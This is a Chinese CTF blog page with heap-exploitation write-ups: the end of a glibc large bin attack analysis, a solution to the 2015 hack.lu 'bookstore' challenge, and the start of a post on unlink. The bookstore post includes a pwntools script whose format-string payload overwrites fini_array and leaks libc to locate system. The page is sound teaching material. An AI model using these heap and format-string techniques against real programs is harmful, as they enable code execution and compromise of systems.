<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:	0x00007ffff7dd1f58	0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:	0x00007ffff7dd1f68	0x00007ffff7dd1f68</span><br></pre></td></tr></table></figure>

<p>到这里为止我们知到了<code>fwd</code>指的是什么了</p>
<h4 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h4><p>接下来跟着程序继续，执行到第22行为止，我们修改了处于large bin中的p2的部分信息，以及将p3放到了unsorted bin中。接下来开始分析第22行的<code>malloc(0x90);</code>这条指令中会发生什么事情。</p>
<p>到这里为止我们知道，unsorted bin中存在两个chunk（p1中剩下的那块、p3）</p>
<p>那么程序接下来就会：取出unsorted bin中的最后一个chunk，将这块chunk放到对应的bin中</p>
<p>这个过程中第一个被取出的chunk就是p1割剩下的那块，这个过程我们不关心。</p>
<p>第二个被取出的chunk就是p3，p3因为属于large bin，所以在这个过程中会将p3放到large bin中</p>
<h5 id="重点开始"><a href="#重点开始" class="headerlink" title="重点开始"></a>重点开始</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3546</span>           <span class="keyword">else</span></span><br><span class="line">  <span class="number">3547</span>             &#123;</span><br><span class="line">  <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br><span class="line">► <span class="number">3550</span>               fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>从上面的分析中我们知道<code>bck</code>是large bin的地址，<code>fwd</code>是这个large bin的fd指针所指向的chunk，对于这里就是p2。</p>
<p>完成上部分代码之后，进入到下面的这块代码（这块代码用来将victim插入到large bin中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)	<span class="comment">//fwd != bck说明large bin不为空</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))	<span class="comment">//判断victim的size是否小于lagre bin中已有的最小chunk，如果小于，则直接插入到最小的那端</span></span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;		<span class="comment">//large bin attack</span></span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)	<span class="comment">//否则，通过这个循环找到lagre bin中最小的大于victim的chunk</span></span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)	<span class="comment">//如果有大小恰好相等的chunk，则用这种方式插入，此时无法利用</span></span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span>	<span class="comment">//否则插入到nextsize链表中</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;	<span class="comment">//large bin attack</span></span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;		<span class="comment">//large bin attack</span></span><br></pre></td></tr></table></figure>

<p>逻辑其实很简单，稍微审一下比听别人描述要简单。</p>
<p>因为我们将<code>fwd</code>的size修改得比<code>victim</code>小，所以最后会进入到第29行处的else分支中.</p>
<p>第32行将<code>fwd-&gt;bk_nextsize</code>写到<code>victim-&gt;bk_nextsize</code>，第34行将<code>victim</code>写到<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>，也就相当于<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize</code>，由于我们修改了<code>fwd-&gt;bk_nextsize</code>为<code>&amp;stack_var2 - 4</code>，所以<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize</code>就相当于<code>*(&amp;stack_var2 - 4 + 4) = stack_var2</code></p>
<p>第36行<code>bck = fwd-&gt;bk</code>，第47行<code>bck-&gt;fd = victim;</code>，综合起来相当于<code>fwd-&gt;bk-&gt;fd = victim</code>，而我们将<code>fwd-&gt;bk</code>修改成了<code>&amp;stack_var1 - 2</code>，所以<code>fwd-&gt;bk-&gt;fd</code>就相当于<code>*(&amp;stack_var1 - 2 + 2) = stack_var1</code></p>
<p>由以上两处利用我们完成了将<code>victim</code>写入到<code>stack_var1</code>跟<code>stack_var2</code>，也就是将一个堆地址写入到两个地址当中。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/10/2015-hacklu-bookstore/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/10/2015-hacklu-bookstore/" class="post-title-link" itemprop="url">2015-hacklu-bookstore</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-10 18:03:18" itemprop="dateCreated datePublished" datetime="2022-05-10T18:03:18+08:00">2022-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-11 00:51:22" itemprop="dateModified" datetime="2022-05-11T00:51:22+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>回顾一下fini_array的内容，值得注意的是fini_array在RELRO半开的时候就不可写了，所以其只能利用在RELRO全关的情况下。因为一般题目都不会把RELRO全关的，所以看到一个全关的情况或许能往这方面想一下。</p>
<p>这题的难点主要在于控制格式化字符串的过程，要想到利用最后的向v5指向的chunk里复制内容的函数来控制格式化字符串，以及这个具体的步骤。其实回过来想每一步都感觉挺合理的，“因为某种方式必定走不通所以只能是那种方式”的这种思维。</p>
<p>unsorted bin不像fast bin，从unsorted bin中取出chunk时不会有所检查，所以可以选择先将某个chunk free到unsorted bin中，再去改它的size位，有时能比较省事</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 || !v7 || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; _____          _   _                 _          _                   _ \n&quot;</span></span><br><span class="line">    <span class="string">&quot;/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / /\\/ _ \\ \\/ / __| &#x27;_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| &#x27;__/ _ \\/  /\n&quot;</span></span><br><span class="line">    <span class="string">&quot; / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n&quot;</span></span><br><span class="line">    <span class="string">&quot; \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Crappiest and most expensive books for your college education!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We can order books for you in case they&#x27;re not in stock.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Max. two orders allowed!\n&quot;</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Edit order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Edit order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Delete order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Delete order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5: Submit&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">        edit(v6);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">        edit(v7);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        v5 = <span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sub_400937(v5, v6, v7);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    v1 = v3++;</span><br><span class="line">    *(v1 + a1) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  *(v3 - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及选择’5‘之后会调用的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400937</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a2, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(a1, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a3, v4);</span><br><span class="line">  *&amp;a1[<span class="built_in">strlen</span>(a1)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能就是拷贝v6和v7所指向的chunk中的内容到v5所指向的chunk中，v5最后用于输出。</p>
<p>程序的逻辑很简单，先按顺序申请出chunk1、chunk2（v6、v7所对应的chunk）以及dest三个块，大小都为0x90。并且可以任意编辑chunk1跟chunk2中的内容。</p>
<p>总的来说本题的三个漏洞点为：① edit函数中的任意长度堆溢出。② delete中的uaf。③ main函数末尾的格式化字符串。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先我们可以确定的一点是程序中可以用来泄漏的一个点只有格式化字符串，但是因为格式化字符串之后main函数就返回了，所以我们肯定还得用某种方式让程序再返回到我们希望的地方，那么这里我们一般就会想到修改fini_array0为main_addr来实现，由于没开启PIE，所以这个思路是可行的。</p>
<h4 id="一、格式化字符串的构造"><a href="#一、格式化字符串的构造" class="headerlink" title="一、格式化字符串的构造"></a>一、格式化字符串的构造</h4><p>那么我们第一步就是思考怎么构造这个格式化字符串，因为其参数是dest，而且我们每次edit完之后都会调用strcpy来往dest中写入字符串，而strcpy函数会在最后补一个结束符，所以就算我们能利用堆溢出修改dest中的内容也没用，最后会被截断。</p>
<p>那么显然我们就只能靠<code>sub_400937()</code>函数了，因为在这个函数里其会将chunk1和chunk2的内容拷贝到v5对应的数组中，而v5对应的chunk是在我们选择了’5’之后再申请的，也就是说我们可以让v5跟dest堆重叠来控制dest中的内容。</p>
<p>但是dest不能直接被free掉，所以只能让v5跟chunk2重叠，然后覆盖掉dest。</p>
<p>这里既然要让v5跟chunk2重叠，那么就要通过chunk1去改掉chunk2的size，但是因为改掉size之后free掉这个chunk时还要过glibc的检测，所以很麻烦，所以我们可以选择<strong>先把chunk2 free掉，再把它的size盖掉</strong>，这样就减少了要伪造的数据，而且其从unsorted bin中被取出的时候也不会对这个chunk有所检查。</p>
<p>接下来我们就要在chunk1里面构造格式化字符串，同时要有一段padding保证在chunk1跟chunk2复制完到v5之后，格式化字符串的本体出现在dest中。</p>
<p>这一部分要描述太麻烦了，但是其实并不是很难，稍微计算下padding即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">free2()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%63c%15$hn%2553c%14$hn&#x27;</span> + <span class="string">&#x27;%31$p&#x27;</span>	<span class="comment">#chunk1 start</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x6c</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">edit1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x151</span>))</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;5&#x27;</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">15</span> + p64(fini_array) + p64(fini_array+<span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">system = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7a2d840</span> - <span class="number">0x7ffff7a523a0</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system = &quot;</span>,<span class="built_in">hex</span>(system)</span><br></pre></td></tr></table></figure>

<p>到这里为止我们完成了libc的泄漏并返回到main函数</p>
<h4 id="二、劫持"><a href="#二、劫持" class="headerlink" title="二、劫持"></a>二、劫持</h4><p>到这里这题其实就没有难点了，感觉还是用格式化字符串简单点，所以我在前面那步多泄漏了个栈地址，然后返回地址改one_gadget就行了，这一部分很简单就不贴exp了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-07 17:29:42" itemprop="dateCreated datePublished" datetime="2022-05-07T17:29:42+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-08 16:21:01" itemprop="dateModified" datetime="2022-05-08T16:21:01+08:00">2022-05-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里先说总结，详细的下面说</p>
<p>总的下来，要利用unlink必须满足三个条件：</p>
<ol>
<li><code>&amp;P</code>的地址已知（保存堆指针的地址）</li>
<li><code>&amp;P-0x18</code>到<code>&amp;P</code>这段空间可写</li>
<li>至少得有一个off-by-one来修改要free掉的chunk的size位。</li>
</ol>
<p>目前感觉就这三个条件，但是例题在2.27下复现失败了，暂时还不知道为啥</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一个chunk从双向链表中取出，而且其还会检测与取出的这个chunk的物理相邻的位置是否还有free chunk，如果有则会触发向前合并（跟物理低地址的chunk合并）/向后合并（跟物理高地址的chunk合并）</p>
<p>结合unlink源码的一部分来看</p>
